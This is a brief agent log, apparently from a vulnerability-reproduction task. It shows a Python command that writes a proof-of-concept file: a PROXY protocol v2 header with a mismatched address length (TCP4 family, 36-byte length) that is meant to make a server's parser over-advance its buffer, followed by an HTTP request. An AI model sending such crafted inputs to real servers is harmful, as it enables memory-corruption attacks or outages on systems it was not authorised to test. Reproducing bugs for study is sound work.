message:
Running command: cd /workspace && python3 -c "
import struct

# PROXY v2 header format:
# - 12 bytes signature: \x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A
# - 1 byte cmd_ver: 0x21 (PROXY command, version 2)
# - 1 byte fam: 0x11 (TCP4)
# - 2 bytes len: length of address data (network byte order)
# - address data

sig = b'\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A'
cmd_ver = 0x21  # PROXY command
fam = 0x11  # TCP4
addr_len = 36  # max allowed by sizeof check (16 + 36 = 52 = sizeof(struct))
# For TCP4, actual address data is 12 bytes, but we set len to 36
# This causes buffer += 52 instead of buffer += 28

# Build the header
header = sig + struct.pack('!BBH', cmd_ver, fam, addr_len)
# Add 36 bytes of address data (TCP6 size, even though fam is TCP4)
addr_data = b'\x00' * 36
header += addr_data

# Add HTTP request after the PROXY header
http_req = b'GET / HTTP/1.0\r\n\r\n'

poc = header + http_req

with open('/workspace/poc.bin', 'wb') as f:
    f.write(poc)

print(f'PoC size: {len(poc)} bytes')
print(f'Header hex: {header.hex()}')
"
